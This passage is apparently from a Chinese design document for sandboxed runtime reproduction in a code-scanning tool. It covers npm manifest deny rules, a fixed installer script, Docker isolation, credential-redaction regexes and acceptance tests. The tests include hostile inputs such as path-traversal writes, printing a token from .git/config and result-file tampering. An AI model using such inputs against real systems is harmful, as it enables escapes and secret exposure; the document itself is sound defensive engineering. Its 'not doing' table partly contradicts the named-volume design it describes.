| 1 | **依赖规格不是 registry 版本/范围/标签** | 遍历 4 个依赖 section 与 `overrides`(递归)的每个规格:不得含 `:`、`/`、`\`(URL/路径/裸 `user/repo` 一律拒),且必须匹配版本范围或 dist-tag。显式拒绝 `git:*`、`git+*`、`file:`、`link:`、`workspace:`、`http:`、`https:`、`gist:`、`sourcehut:`、`github:`、`npm:` 指向非 registry 的 alias |
| 2 | **lockfile 版本** | 只接受 `lockfileVersion` 2 或 3;**v1 拒绝**(它的 `resolved` 在 `lock.dependencies` 下,遍历不到) |
| 3 | **lockfile `resolved` 与 `integrity`** | 遍历 `lock.packages`:每个非根条目必须有 `resolved` 与 `integrity`;`resolved` 必须是 `https:`、host 精确 `registry.npmjs.org`、端口空或 443。缺 `integrity` 内容就能被换,所以也拒 |
| 4 | **生命周期脚本** | `scripts` 的 `preinstall`/`install`/`postinstall`/`prepare`/`prepack`/`prepublish` 任一非空即拒。**没有白名单**:`husky` 也拒(白名单会持续扩大);`patch-package` 被跳过会让依赖行为与仓库不符,复现失真比不跑更糟 |
| 5 | **workspace / `.npmrc`** | `pnpm-workspace.yaml`、`lerna.json`、`package.json#workspaces`、任何 `workspace:*`、暂存目录外存在任何 `.npmrc` → 拒绝 |

> 这五项是**指令级**检查:只解析 JSON/YAML、做字符串比较,**不执行任何东西**。

#### 5.2.3 固定 installer(不经过 shell)

与 §4.3 的 runner 同构:编译期固定的 Node 源码,通过 `--entrypoint node -e` 传入,不经过 shell。

```js
// INSTALLER:固定源码。
// /src 是只含 manifest/lockfile 的暂存目录(仓库源码不在里面)。
// 依赖装进 /deps/stage,成功后发布到 volume 根(/deps),再写成功标记。
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const OFFLINE = process.env.INSTALL_MODE !== 'online';
const emit = (o) => process.stdout.write('@@INSTALL@@' + JSON.stringify(o) + '\n');
const sanitize = (v) => String(v == null ? '' : v).slice(0, 40).replace(/[^\x20-\x7e]/g, '?');
// 拒绝原因只带 key 名,绝不回显规格/脚本内容(里面可能有凭据)
const REJECT = (reason) => { emit({ ok: false, reason }); process.exit(0); };

/** 是否为可接受的 registry 规格:版本范围或 dist-tag,且不含 URL/路径。 */
function specOk(spec) {
  if (typeof spec !== 'string') return false;
  const v = spec.trim();
  if (v === '') return false;
  if (/[\\/:]/.test(v)) return false;
  if (/^(workspace|link|file|portal|patch)$/i.test(v)) return false;
  return /^[~^*<>=|\s0-9.xXa-zA-Z+-]*$/.test(v);
}

try {
  let raw;
  try { raw = fs.readFileSync('/src/package.json', 'utf8'); } catch { REJECT('no package.json'); }
  let pkg;
  try { pkg = JSON.parse(raw.replace(/^\uFEFF/, '')); } catch { REJECT('package.json unparsable'); }

  // 1) 规格检查:4 个 section + overrides(递归)
  const SECTIONS = ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies'];
  const walkSpecs = (obj, where) => {
    if (!obj || typeof obj !== 'object') return null;
    for (const k of Object.keys(obj)) {
      const v = obj[k];
      if (typeof v === 'string') {
        if (!specOk(v)) return 'unsupported spec in ' + where + ': ' + sanitize(k);
      } else if (v && typeof v === 'object') {
        const nested = walkSpecs(v, where + '.' + sanitize(k));
        if (nested !== null) return nested;
      }
    }
    return null;
  };
  for (const s of SECTIONS) {
    const bad = walkSpecs(pkg && pkg[s], s);
    if (bad !== null) REJECT(bad);
  }
  const badOverride = walkSpecs(pkg && pkg.overrides, 'overrides');
  if (badOverride !== null) REJECT(badOverride);

  // 4) 生命周期脚本(只报 key,不回显脚本内容)
  const LIFECYCLE = ['preinstall', 'install', 'postinstall', 'prepare', 'prepack', 'prepublish'];
  const scripts = (pkg && pkg.scripts) || {};
  for (const k of LIFECYCLE) {
    if (typeof scripts[k] === 'string' && scripts[k].trim() !== '') {
      REJECT('lifecycle script present: ' + k);
    }
  }

  // 5) workspace
  if (pkg && pkg.workspaces !== undefined) REJECT('workspaces field present');
  for (const f of ['pnpm-workspace.yaml', 'lerna.json']) {
    if (fs.existsSync(path.join('/src', f))) REJECT('workspace config present: ' + f);
  }

  // 2)+3) lockfile 版本与 resolved/integrity
  const LOCKS = ['npm-shrinkwrap.json', 'package-lock.json'];   // shrinkwrap 优先
  const lockPath = LOCKS.map((f) => path.join('/src', f)).find((p) => fs.existsSync(p)) || '';
  if (lockPath === '') REJECT('no lockfile');
  let lock;
  try { lock = JSON.parse(fs.readFileSync(lockPath, 'utf8')); } catch { REJECT('lockfile unparsable'); }
  const lv = Number(lock && lock.lockfileVersion);
  if (!(lv === 2 || lv === 3)) REJECT('lockfileVersion not 2/3: ' + sanitize(lv));
  const pkgs = (lock && lock.packages) || {};
  for (const key of Object.keys(pkgs)) {
    if (key === '') continue;                               // 根条目没有 resolved
    const e = pkgs[key];
    if (!e || typeof e !== 'object') REJECT('lockfile entry malformed');
    if (typeof e.resolved !== 'string' || typeof e.integrity !== 'string') {
      REJECT('lockfile entry missing resolved/integrity: ' + sanitize(key));
    }
    let u;
    try { u = new URL(e.resolved); } catch { REJECT('lockfile resolved not a URL'); }
    if (u.protocol !== 'https:') REJECT('lockfile resolved not https: ' + sanitize(key));
    if (u.hostname.toLowerCase() !== 'registry.npmjs.org') REJECT('lockfile resolved host not allowlisted');
    if (u.port !== '' && u.port !== '443') REJECT('lockfile resolved port not allowed');
  }

  // npm 的 user/global 配置源必须是两个不同的空文件(都指 /dev/null 会抛 duplicate-config)
  fs.writeFileSync('/tmp/npm-userconfig', '');
  fs.writeFileSync('/tmp/npm-globalconfig', '');

  // 只复制 manifest 进安装子目录;不复制任何 .npmrc
  const stage = '/deps/stage';
  fs.mkdirSync(stage, { recursive: true, mode: 0o777 });
  for (const f of ['package.json', 'npm-shrinkwrap.json', 'package-lock.json']) {
    const from = path.join('/src', f);
    if (fs.existsSync(from)) fs.copyFileSync(from, path.join(stage, f));
  }

  const env = {
    PATH: process.env.PATH,
    HOME: '/tmp',
    TMPDIR: '/tmp',
    npm_config_userconfig: '/tmp/npm-userconfig',
    npm_config_globalconfig: '/tmp/npm-globalconfig',
    npm_config_registry: 'https://registry.npmjs.org/',
    npm_config_ignore_scripts: 'true',
    npm_config_audit: 'false',
    npm_config_fund: 'false',
    npm_config_update_notifier: 'false',
  };
  if (OFFLINE) {
    env.npm_config_cache = '/npm-cache';
    env.npm_config_offline = 'true';
  } else {
    env.npm_config_cache = '/tmp/npm-cache';
  }
  const args = ['ci', '--omit=optional', '--no-audit', '--no-fund'];
  if (OFFLINE) args.push('--offline');

  const r = spawnSync('npm', args, {
    cwd: stage, encoding: 'utf8', timeout: 240000, maxBuffer: 16 * 1024 * 1024, env,
  });
  const out = String(r.stdout || '');
  const err = String(r.stderr || '');
  if (r.status !== 0) {
    emit({
      ok: false,
      offline: OFFLINE,
      status: typeof r.status === 'number' ? r.status : -1,
      stdoutTail: redact(out).slice(-1200),
      stderrTail: redact(err).slice(-1200),
    });
    process.exit(0);
  }

  // 发布:把 stage/node_modules 的内容移到 volume 根,使 /deps 本身就是依赖树。
  // repro 因此可以把 volume 根挂到 /src/node_modules,得到 /src/node_modules/express。
  for (const name of fs.readdirSync(path.join(stage, 'node_modules'))) {
    fs.renameSync(path.join(stage, 'node_modules', name), path.join('/deps', name));
  }
  fs.rmSync(stage, { recursive: true, force: true });

  // 成功标记:只有它存在且 fingerprint 匹配才算装好
  // (volume 由 Docker 在启动前创建,「volume 存在」不等于「装完了」)
  fs.writeFileSync('/deps/.code-scan-install-ok', JSON.stringify({
    fingerprint: process.env.DEPS_FINGERPRINT || '',
    offline: OFFLINE,
    at: new Date().toISOString(),
  }));

  emit({ ok: true, offline: OFFLINE, status: 0, stdoutTail: redact(out).slice(-1200), stderrTail: redact(err).slice(-1200) });
} catch (e) {
  emit({ ok: false, reason: redact(String((e && e.message) || e)) });
}

function redact(s) {
  return String(s)
    .replace(/([a-zA-Z][a-zA-Z0-9+.-]*:\/\/)[^\s/:@]+:[^\s/@]+@/g, '$1[redacted]@')
    .replace(/(AKIA|ASIA)[0-9A-Z]{16}/g, '[redacted]')
    .replace(/\b(ghp_|gho_|ghu_|ghs_|ghr_|glpat-|xox[bpar]-|sk-)[A-Za-z0-9_-]{10,}/g, '[redacted]')
    .replace(/(_authToken|_auth|password|secret|token)\s*=\s*\S+/gi, '$1=[redacted]')
    .replace(/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g, '[redacted]');
}
```

**三处需要解释的地方**:

1. **拒绝原因不回显规格/脚本内容**:`"private-git": "git+https://ci:<token>@github.com/.../private.git"` 里的 token 会原样进入 `@@INSTALL@@` → note → 报告。所以 `REJECT` 只报 key 名,并经过 `sanitize` 截断。这条同样适用于 §4.3 的 runner。
2. **为什么 `userconfig` 挡不住项目 `.npmrc`**:npm 的 `loadProjectConfig()` 读 `localPrefix/.npmrc`,与 `userconfig` 是不同层。真正起作用的是**暂存目录里没有 `.npmrc`**,且 `localPrefix` 是 `/deps/stage`(`spawnSync` 的 `cwd`;`/src` 是兄弟挂载,不是祖先,npm 不会向上找到仓库里的 `.npmrc`)。`npm_config_*` 环境变量只在同一 key 上压过项目配置,**不覆盖** `@scope:registry`/`proxy`/`strict-ssl`/`cafile`/`script-shell`/`node-options`——所以不要把 `userconfig` 当防线。
3. **保留拒绝 git 依赖,理由不依赖 `ignore-scripts` 的传播**:评审在 npm 11.6.2 里核实,`npm_config_ignore_scripts=true` 会经 `process.env` 传给 pacote 的嵌套 `npm install`,所以「`prepare` 绕过 `--ignore-scripts`」在该版本下**不成立**。但这个结论**没有在镜像自带的 npm 上验证过**(`node:22-slim` 带 npm 10.x)。所以拒绝的真实理由是**与 npm 版本无关**的两条:git 依赖引入不受控的嵌套解析与网络路径;一旦 `ignore-scripts` 的实现方式变化就是 RCE。探测阶段单独核对镜像内 npm 版本(§8 第 7 步),实现时须在该版本上复核这条传播行为——但**无论复核结果如何,拒绝都保留**(纵深防御)。

#### 5.2.4 host 缓存目录

offline 模式挂 `<home>/.npm`(缓存**根**)只读到 `/npm-cache`。它由 `NPM_CACHE_CODE` 片段解析(系统路径,与 `mkdtemp` 同源),**不能用 `files.glob`**(那是工作区 API)。

为什么是根而不是 `_cacache`:npm 把 content store 放在 `<cache>/_cacache` 下。若把 `_cacache` 挂成 `/npm-cache`,npm 会找 `/npm-cache/_cacache`(不存在),缓存永远是空的 → 每次 offline install 都 `ENOTCACHED`。挂根目录,`npm_config_cache=/npm-cache` 才能命中。

缓存缺失时:该仓库 `unavailable`,note 明确写「缓存缺包;先在本地跑一次 `npm ci` 预热,或加 `runtimeVerifyOnline=true`」。

#### 5.2.5 依赖 volume 的生命周期

- 名字:`code-scan-deps-<asciiRepoId>-<fingerprint 前 16 位>`
  - `asciiRepoId`:对**仓库标识**算 sha256 取前 20 位十六进制。既有 `slug()` 保留非拉丁字符(默认仓库名是 `当前工作区`),不是合法 Docker volume 名;十六进制天然合法、无前导 `-`、无逗号
  - 仓库标识取**用户提供的仓库名或绝对本地路径**(来自受信的 `repos` 列表),**不用 `package.json#name`**(那是仓库内容)
  - `fingerprint = sha256(生效 lockfile + package.json + 镜像 digest + 平台 + 安装策略版本)`。只哈希 lockfile 不够:换镜像或改策略都会让同一个 volume 名对应不同产物
- **复用条件不是「volume 存在」,而是「成功标记存在且 fingerprint 匹配」**:
  - volume 由 Docker 在容器启动前创建,安装失败/超时/中断都会留下空或半成品 volume
  - 标记 `/deps/.code-scan-install-ok` 只在成功发布后写入
  - 复用前用一个**只读 helper 容器**读该文件比对 fingerprint(host 侧没有 fs,必须走容器)
  - 缺失或不匹配 → `docker volume rm <v>` 后重建,不「原地清空」:
    - volume 名已含 fingerprint,标记不匹配只可能是异常遗留(旧策略产物、人为改动)
    - 此时我们持有该 volume 的锁,且没有任何容器引用它,删除是安全的
    - 删除失败(仍被引用)→ 该仓库 `unavailable`,不绕过
- **并发保护**:`code-scan-deps-lock-<volumeName>` 标记 + 短忙等;拿不到锁 → 该仓库 `unavailable`,不阻塞其它仓库
- **不自动删除**:volume 会累积;审计目录记录本次用的 volume 名与 fingerprint,用户可自行 `docker volume rm`
- repro 阶段**只读挂载**:`type=volume,source=<v>,target=/src/node_modules,readonly`(volume 根就是依赖树)

#### 5.2.6 安装失败与降级分类

- 该仓库所有复现记 `unavailable`,note 写 `install 失败: <原因>`
- 记入 `notCovered`:`<repo>: 依赖安装失败,运行时复现跳过`
- **不降级到 host 执行**,**不使用仓库自带的 `node_modules`**(即使存在)

**degraded 依赖单独标注**:`--omit=optional` + `ignore_scripts` 会让 esbuild / sharp / puppeteer / playwright / better-sqlite3 不可用。`unavailable` 的 note 必须写清「安装策略:scripts 已禁用、optional 已省略」,而不是只给一句 `Cannot find module @esbuild/linux-x64`。另加**已知 native 包预检**:lockfile 里出现这些包名时,报告预先声明「本仓库含需要构建脚本的原生依赖,复现结果可能不完整」。

### 5.3 两段式的时序

```
per repo(有 repro 的发现时):
  1. WALK_LINKS_CODE(§6.3)→ 失败则整仓跳过;必须在 staging 之前
  2. MANIFEST_CHECK_CODE(§5.2.2 五项,只解析不执行)
     └ 任一项命中 → 该 repo 全部 unavailable,跳过
  3. MANIFEST_STAGE_CODE:建只含 package.json + lockfile 的暂存目录
     └ 每个待复制文件先 lstat,必须是普通文件(不跟随符号链接)
     └ 同时算 fingerprint
  4. volume 的成功标记存在且 fingerprint 匹配?
     └ 是 → 进 6
     └ 否 → 拿锁 → docker volume rm(异常遗留时重建)→ VOLUME_PREP_CODE(volume 根 chown 65534)
              → install 容器(§5.2.1),300s 超时
              └ 失败 → 该 repo 全部 unavailable;释放锁
  5. 读标记复核 fingerprint(只读 helper 容器);不匹配 → 回到 4 重装
  6. 对每条发现起 repro 容器(§5),volume 根 → /src/node_modules 只读挂载
```

**install 每仓库最多一次**,不是每条发现一次。


## 6. 主机侧不变量

### 6.1 工作区不写任何复现产物

- 不写复现文件到工作区。脚本经环境变量传入,容器内写到 tmpfs。
- 不挂 host 可写目录。没有 `/work` 的 host 侧路径,就没有「仓库预置 symlink 让 `-v` 挂到工作区外」这条路。
- 审计产物(spec、docker argv、runner 输出)**写到系统私有临时目录**,与 `generate-draft.mjs` 用 `mkdtemp` 的草稿同源。
- **审计文件名固定**(`spec-<n>.json`、`argv-<n>.json`、`output-<n>.json`),`mkdtemp` 建目录,写入用 `flag:"wx"`。**绝不** `join(auditDir, modelString)`——那会把 `..\..\` 还回来。
- 只有脱敏后的输出写进审计目录。

### 6.2 `docker` 二进制不能被顶替

`world.run` 的命令名必须是编译期字面量,只能写 `"docker"`。Windows 的 `CreateProcess` 先查当前目录,而工作流 cwd 就是被扫工作区。

**不能复用 `npmGuard` 的返回**:`NPM_GUARD_CODE` 返回单一 `bins` 数组,`npmToolsShadowed` 消费整个数组并一次性停用 ast/graph/knip/jscpd。把 `docker` 加进 `tools` 会让任意一个 `docker.cmd` 把整个扫描降级成 grep。

处置:

1. 新增一个只查 `docker` 的独立片段(`tools` 列表只含 `docker`),返回 `dockerBins`
2. `dockerBins.length > 0` → 只停用 runtime verify
3. 现有 `npmToolsShadowed` 的判定完全不变
4. **每次 docker 调用前重新检查一次**,不只在扫描开始时检查一次

### 6.3 仓库含符号链接/联接时跳过

`/src` 挂的是 host 真实目录。Docker Desktop 在 Windows 上会透过 NTFS junction/reparse point 解析,可能暴露挂载子树之外的内容。

处置:挂载前用递归 `lstat` 遍历仓库,**发现任何符号链接或联接就跳过该仓库的 runtime verify**。既有 `CHECK_PATH_CODE` 只走单一路径的组成部分,不能复用,需要新片段。

- 遍历上限 50000 条目,超限同样跳过并记录(**fail-closed**)
- 遍历包含 `node_modules` 和 `.git`——排除它们会留下 junction 逃逸口子
- 遍历带独立超时(60s)
- **每次 docker 调用前重跑一次**(`localPath` 仓库可变,存在 TOCTOU)
- 已知后果:pnpm 仓库大量使用符号链接,会整体跳过;装了依赖的仓库条目数可能超限。这两条都写进 `notCovered`

### 6.4 挂载源必须是绝对路径且已存在

用 host Node 的 `path.resolve` + `realpath` 得到绝对原生路径,整体作为一个 argv 元素。

- **用 `--mount type=bind,source=...,target=/src,readonly` 而不是 `-v`**:
  - `-v` 在源不存在时**静默创建空目录**,导致后续所有 `require` 失败而不是明确报错
  - `--mount` 在源不存在时直接失败
  - Windows 盘符的冒号在 `-v` 里有解析歧义
- `--mount` 的值按逗号切分,**路径含逗号时拒绝该仓库**并记录
- 相对路径会变成 named volume(另一个静默错误),必须绝对

### 6.5 输出脱敏

`/src` 里有 `.git/config`(可能含 credential 的 remote URL)、`.env`、未跟踪文件。脚本可以把它们打印出来。

- **脱敏在容器内的 runner 里对完整输出执行,然后才截断**(§4.3 的 `redact()`)
- 覆盖:`scheme://user:pass@`、`AKIA`/`ASIA`、`ghp_`/`gho_`/`glpat-`/`xox*-`/`sk-`、`_authToken`/`password`/`secret`/`token` 赋值、PEM 私钥块
- 报告里只放 1500 字符尾部
- 审计目录同样只存脱敏后的输出

**残余**:`--network=none` 阻止网络外传,但阻止不了「报告把这个值带回给模型/用户」这条通道。所以脱敏是必须的,而不是可选的。

### 6.6 host 侧需要新增的 Node 片段

工作流脚本**没有** `Buffer`、`btoa`、`TextEncoder`、`fs`、`path`(facade 明确禁止 Node/web API)。以下操作都必须走 `world.run("node", ["-e", SNIPPET, ...])`:

| 片段 | 作用 |
|---|---|
| `B64_CODE` | 把 spec JSON 编码成 base64,**同时执行 UTF-8 字节上限检查**(§9) |
| `WALK_LINKS_CODE` | 递归 `lstat`,发现链接即失败;输出条目计数 |
| `REALPATH_CODE` | `path.resolve` + `realpath`,输出绝对路径;验证是目录 |
| `AUDIT_DIR_CODE` | `mkdtemp` 建系统临时目录,输出路径 |
| `AUDIT_WRITE_CODE` | 在审计目录内以固定名 + `wx` 写入 |
| `MANIFEST_CHECK_CODE` | 读 `package.json` / lockfile,**指令级**执行 §5.2.2 的五项拒绝:协议、生命周期脚本、workspace、lockfile `resolved` 主机白名单、`.npmrc` 存在性。只解析 JSON,不执行任何东西 |
| `VOLUME_PREP` | 实现为两次直接 `world.run("docker", ...)`,不是 Node 片段:`volume create`(幂等)+ 一个 `--user 0:0 --cap-add=CHOWN` 的固定容器把 **volume 根**(`/deps`)`chown` 65534。发布(`rename` 到 `/deps/<name>`)与成功标记(`/deps/.code-scan-install-ok`)都写在根上,只 chown 子目录会让发布每次 EPERM(§5.2.3、§5.2.5) |
| `MANIFEST_STAGE_CODE` | 在系统临时目录建一个只含 `package.json` + lockfile 的暂存目录(**只复制这三个文件名,每个先 lstat 确认是普通文件**),作为 install 容器的 `/src`;顺带算 `fingerprint`(§5.2.5) |
| `NPM_CACHE_CODE` | 解析 `<home>/.npm`(缓存**根**)的绝对路径并确认存在(offline 模式用;**不是** `_cacache`,见 §5.2.4) |

这九个片段是本设计新增的 host 代码面,与既有 `fsPresence`/`npmGuard`/`WRITE_CODE` 同一模式。

> `MANIFEST_CHECK_CODE` 是**唯一一个安全关键片段**:它决定一个仓库能否进入安装阶段。它必须只做 JSON/YAML 解析与字符串比较,**不得** `require` 仓库代码、不得 `eval`、不得读取 `node_modules`。

## 7. 流程插入点

```
Plan → Shard → Map(审查员产出 finding + 可选 repro)
                              ↓
                    Ground(确定性,已实现)
                              ↓
                    Judge → Global → Merge
                              ↓
                report() 先发一轮(复现: 待运行)   ← 新增
                              ↓
                Reproduce(容器,opt-in,顺序)        ← 新增
                  └ 每仓库:先 install(一次),再逐条 repro
                              ↓
                report() 用同一 key 再发一轮(带复现结果)
```

**放在 merge 之后**而不是 Judge 之前:

- Judge 完全不用改
- 不为合并前的重复项重复执行
- 按严重度取前 N 条,天然按 high→medium 分配名额

**先 report 再复现**:facade 的 salvage 规则是「每条发现落地就 report」。12 条 × 60s 最长 12 分钟,期间脚本失败或被停会丢掉全部发现。所以 merge 后立即 report 一轮(`复现: 待运行`),每条复现完成后再用同一 `key` re-report(看板的 `key` 会把卡片原位更新)。

**顺序执行**,不并发:避免容器争抢 CPU 干扰计时类判定;不引入新并发旋钮;资源占用确定。

**全局评审的新发现**:`GlobalFinding` 目前没有 `repro` 字段,全局评审的提示词也不要求脚本。三条路:

- (a) 给 `GlobalFinding` 加同样字段并在提示词里要求 —— v1 不做
- (b) 明确排除,写进 `notCovered` —— **v1 选这个**

**`normalizeFinding` 会丢 `repro`**:它重建一个新对象,只保留 6 个既有字段。实现必须在 `normalizeFinding` 里显式保留并校验 `repro`,否则每个 spec 都会静默消失,后半段无东西可跑。同理,去重合并时要**按 key 带上 spec**——`dedupeFindings` 可能保留一个没有 spec 的全局重复项,丢掉带 spec 的 Map 发现。

## 8. 能力探测与降级

只做一次,结果复用。任一环失败 → 整体跳过 + 逐条写进 `notCovered`。

| # | 检查 | 失败处置 |
|---|---|---|
| 1 | 独立 `docker` 顶替检查(§6.2) | 停用 |
| 2 | `world.run("docker", ["version"], {timeoutMs: 15000})` 退出 0 | 停用(daemon 未运行/CLI 缺失) |
| 3 | `docker context inspect --format '{{json .}}'` 的 `Endpoints.docker.Host` 以 `npipe://` 或 `unix://` 开头 | 停用(远程 daemon 上 `F:\` 路径无意义) |
| 4 | 环境变量 `DOCKER_HOST` 未设置或同样指向本地 | 停用(它会静默覆盖 context) |
| 5 | `docker image inspect <镜像@digest>` 成功且 `RepoDigests` 含该 digest | 尝试 `docker pull`(单独 300s 超时);仍失败则停用 |
| 6 | 一次真实探测容器:同 mount/同 user/同 network,跑 `node -e "require('fs').writeFileSync('/work/probe','1')"` | 停用(挂载或权限问题;避免每条发现都失败 12 次) |
| 7 | **镜像内 npm 版本**:探测容器里跑 `npm --version`,主版本必须等于 `REPRO_IMAGE_NPM_MAJOR` | 停用(安装语义按该 npm 版本核对过;版本不符则 `ignore-scripts` 传播与 `ci --offline` 行为都不再有依据) |
| 8 | 每仓库:链接检查(§6.3)、realpath(§6.4)、路径无逗号 | 该仓库停用 |

**第 3 步不能用「context 名是 default」**:本机实际 context 是 `desktop-linux`,字面比对会让功能在这台目标机器上永久停用。

**第 5、6 步是关键**:没有它们,镜像未拉取或盘未共享会让 12 条复现全部 `error`,白等 12 分钟。

**本机当前状态**:CLI 29.4.1 在,**daemon 未运行** → 第 2 步失败 → 整体停用。这是需要最先验证的降级路径。

## 9. 配置与常量

只加**一个** args:

```yaml
runtimeVerify:
  type: boolean
  default: false
  description: 'true 时在隔离容器里执行仓库代码做运行时复现(需要 Docker daemon 与本地 context);默认关闭'
runtimeVerifyOnline:
  type: boolean
  default: false
  description: '安装依赖时允许联网。默认走离线(读本机 npm 缓存);开启后安装容器可访问任意主机,风险更高'
```

固定常量:

| 常量 | 值 | 理由 |
|---|---|---|
| `MAX_REPRO` | 12 | 按严重度取前 12 条 |
| `REPRO_SCRIPT_MAX_BYTES` | 8192 | **按 UTF-8 字节**,不是字符(见下) |
| `REPRO_TIMEOUT_MS` | 60000 | 容器内脚本 52s + docker 启动余量 |
| `REPRO_IMAGE` | `node:22-slim@sha256:<实现时填真实 digest>` | 钉死,不可配置 |
| `REPRO_IMAGE_NPM_MAJOR` | `10` | 镜像自带 npm 的主版本(`node:22-slim` = npm 10.x)。探测时用 `npm --version` 比对,不符即整体停用——§5.2.3 第 3 条的 `ignore-scripts` 传播结论只在被核对的版本上有依据 |
| `RATIO_MIN` / `RATIO_MAX` | 2.5 / 100 | 模型给的 `threshold` **越界即拒绝 spec,不钳制**。**下限 2.5 而非 1.5**:纯线性代码 n→2n 的耗时比通常就在 2 附近,阈值低于 2.5 会把 O(n) 判成超线性 |
| `RATIO_FLOOR_MS` | 50 | `t1Ms` 低于此值时 `ratio-greater` 判无效 |
| `INSTALL_TIMEOUT_MS` | 300000 | install 容器总超时(容器内 npm ci 240s + 启动余量) |
| `INSTALL_MAX_MEMORY` | `2g` | install 比 repro 吃内存(npm 解包) |
| `MANIFEST_MAX_BYTES` | 2097152 | package.json / lockfile 上限,超限跳过 |
| `DEPS_VOLUME_PREFIX` | `code-scan-deps-` | volume 名前缀;后接 sha256(仓库标识) 前 20 位 + fingerprint 前 16 位(§5.2.5) |
| `INSTALL_POLICY_VERSION` | `1` | 参与 fingerprint;改安装策略(如加 `--omit=optional`)必须递增 |

**为什么是字节**:8,192 个非 ASCII 字符是 24,576 字节,base64 后 32,768 字符,单独就撞上 Windows 32,767 的命令行上限。所以:

- 上限在 `B64_CODE` 片段里**按 `Buffer.byteLength(script, "utf8")` 检查**,超限的 spec 直接拒绝并记入 `notCovered`
- 编码后若 `base64.length > 24000` 也拒绝
- 总 argv 预算:runner ~1.3KB + base64 ≤ 24KB + flags/路径/镜像 ~2KB ≈ 27KB,留有余量

**不做 `runtimeImage`**:用户可选镜像 = 又一个可执行文件的信任输入。

**不做 `runtimeVerifyMax`**:常数够用,减少一个可能被误设成 0(等于不限制)的旋钮。

只有 `high` 和 `medium` 且 Ground 通过的发现进入复现队列,`low` 不做。

## 10. v1 范围

### 做

- node-only;`/src` 只读挂载
- **两段式依赖安装**(§5.2):install 容器**默认离线**(`--network=none` + 读 host npm 缓存);`runtimeVerifyOnline=true` 才联网。依赖装进 named volume,repro 容器断网、volume 只读挂载
- 安装前五项 manifest 检查(§5.2.2),任一命中则该仓库跳过运行时复现
- 单 `script`(导出 `run()`)+ 主机侧 `assertion`(§4)
- 全套隔离 flag(§5)+ 主机侧不变量(§6)
- 结果四分类(§4.4),`status` 保持两态(§4.5)
- merge 之后顺序执行,上限 12 条,先 report 再复现
- 审计目录在系统临时目录,报告里给出路径
- 计数:attempted / reproduced / notReproduced / unavailable / error,以及跳过原因
- 默认关闭 + 七级探测降级(§8)

### 不做,以及为什么

| 不做 | 理由 |
|---|---|
| Python / 多语言安装 | v1 只做 npm。pip/poetry/cargo 的等价物(`--no-build-isolation`、`pip install --only-binary`、`.cargo/config` 的 `[source]` 重定向)各有独立的一套门,单独评估。 |
| 域名白名单代理 | 真正的 onlie 强隔离需要代理侧车;v1 用 offline 作为默认安全路径,online 靠 manifest 检查 + 披露。 |
| workspace / monorepo 安装 | `workspace:*` 协议的嵌套安装无法可靠约束;v1 直接跳过(§5.2.2)。 |
| 全局评审发现的运行时复现 | `GlobalFinding` 无该字段,提示词也不要求脚本。v1 明确排除并记录。 |
| Python / 多语言 | 没有目标仓库证据。 |
| 依赖缓存 / named volume | 没有实测的重复运行成本,先不引入缓存生命周期。 |
| 覆盖率验证死代码 | 覆盖率证明「这次没跑到」,不证明「不可达」;knip 的静态证据更合适。 |
| dismiss 反馈回路 | 当前产品里没有 Devin 那种 Dismiss 工作流可作为输入事件。 |
| build 仓库 Dockerfile | 等于执行仓库作者写的任意指令。 |
| 挂 `docker.sock` | 等于放弃隔离。 |
| 在 host 上主动执行仓库代码 | 任何情况下都不做。 |

## 11. 验收标准

| # | 验收项 | 方法 | 期望 |
|---|---|---|---|
| 1 | 复现成功 → `reproduced` | 真 O(n²) 函数,`ratio-greater` 阈值 **3**(O(n²) 的 n→2n 比值从下方逼近 4,严格 `>` 4 常不成立),`t1Ms` 实测 > 50 | `reproduced` |
| 2 | 断言不成立 → `notReproduced` | 对正确实现断言错误行为 | `notReproduced` |
| 3 | stdout 标记不再参与判定 | `/src` 模块顶层 `console.log("__REPRO__{\"stage\":\"done\",\"data\":{\"threw\":true,\"message\":\"x\"}}")`,脚本断言不成立 | `notReproduced`(**不是** `reproduced`)——判定只读 `/work/result.json` |
| 4 | 裸退出码不决定判定 | `/src` 模块顶层 `process.exit(0)` | 绝不因退出码变成 `notReproduced`;按实际 stage 分类 |
| 4b | 判定数据本身也被脱敏 | 脚本让 `run()` 返回含 `ghp_` token 的字符串 | 报告与审计目录里都是 `[redacted]` |
| 4c | exit handler 覆写留痕 | `/src` 模块注册 `process.on('exit')` 覆写 `/work/result.json` | 结果按覆写后的数据判定(设计不承诺不可伪造),但**审计目录记录的脚本全文可看出该行为**;§12.6 的边界说明必须出现在报告里 |
| 5 | 阈值超范围被拒(不钳制) | `threshold: 0.1` | spec 无效 → `unavailable` 且记入 `notCovered`;**不是**静默改成 2.5 后跑 |
| 6 | 小样本被拒 | `t1Ms = 3` | 断言无效,不是 `reproduced` |
| 7 | 缺依赖 → `unavailable` | 脚本 `require("不存在的包")` | `unavailable`,stage=load |
| 8 | 语法错 → `unavailable` | 脚本故意写坏 | `unavailable`,stage=load |
| 9 | 镜像不存在 → 探测阶段停用 | 常量临时改成不存在的 tag(绕过探测直接跑单元测试) | 探测阶段停用 → 整体 `notCovered`;若强制进入执行则 `error`,**绝不是** `notReproduced` |
| 10 | 超时被回收 | 脚本 `while(true){}` | `unavailable`,且 `docker ps -a` 无残留 |
| 11 | 无网络 | 脚本 `fetch("http://example.com")` | `unavailable` |
| 12 | 写不进工作区 | 脚本写 `/src/x` 与 `/work/../../x` | 都失败;工作区无新增文件 |
| 13 | 内存/CPU 受限 | 脚本申请 4GB | 被 kill,宿主不死 |
| 14 | daemon 不在 → 优雅降级 | 停掉 Docker Desktop 跑完整扫描 | 扫描正常完成,`notCovered` 有记录 |
| 15 | 默认关闭 | 不带 `runtimeVerify` 跑一次 | **零次** docker 调用(`notCovered` 有一条说明) |
| 16 | 容器命令确认是 `node -e <RUNNER>` | 审计目录里的 argv 加一次 `docker run` 的 `--entrypoint node` 位置断言 | 成立 |
| 17 | `docker.exe` 顶替 → 只停 runtime verify | 工作区根放 `docker.cmd` | runtime verify 停用;knip/jscpd/madge/ast-grep **仍运行** |
| 18 | 仓库含 symlink → 跳过该仓库 | 仓库里造符号链接 | 该仓库跳过,其它仓库不受影响 |
| 19 | 凭据不外泄 | `.git/config` 塞带 token 的 URL,脚本打印它 | 报告与审计目录里是 `[redacted]`;含跨 1500 字符边界的 token |
